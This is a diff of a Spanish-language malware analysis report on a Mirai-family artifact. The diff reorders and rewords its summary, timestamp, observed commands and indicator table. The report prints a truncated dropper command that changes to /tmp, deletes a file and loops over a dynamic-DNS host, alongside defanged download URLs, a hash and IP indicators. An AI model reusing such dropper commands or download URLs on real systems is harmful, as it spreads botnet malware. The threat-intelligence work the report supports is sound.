@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución, Limpieza, Yara signature match. Se registró 1 detección YARA válida. Se asociaron 2 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución, Limpieza, Yara signature match. Se identificaron 2 comandos observados o extraídos. Se identificaron 6 indicadores técnicos. Una detección YARA válida respalda el análisis.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:40:04+00:00`
+- **Registrado:** `2026-08-09T19:40:04.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,20 +51,20 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 ## 🖥️ Comandos observados / extraídos
 
 ```text
--bash: syntax error near unexpected token `(wget'\n
 [4hroot@fedora-edge:~# cd /data/local/tmp 2>/dev/null||cd /tmp;rm -f /data/local/tmp/.d;for h in x9k4p7m2q5r8t3v6.mooo.c
+-bash: syntax error near unexpected token `(wget'\n
 ```
 
 ## 🌐 Indicadores
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 23.95.15.XXX | static_analysis |
 | url | hxxp://$h:8080/bin/dlr.x86_64 | strings |
 | url | hxxp://$h:8080/bin/dlr.x86_64)2 | strings |
-| hash | b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14 | static_analysis |
-| command | -bash: syntax error near unexpected token `(wget'\n | strings |
+| ip | 23.95.15.XXX | static_analysis |
 | command | [4hroot@fedora-edge:~# cd /data/local/tmp 2>/dev/null\|\|cd /tmp;rm -f /data/local/tmp/.d;for h in x9k4p7m2q5r8t3v6.mooo.c | strings |
+| command | -bash: syntax error near unexpected token `(wget'\n | strings |
+| hash | b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14 | static_analysis |
 | ip | [internal-ip-redacted] | artifact_source |
 
 ## 🧬 Detecciones YARA
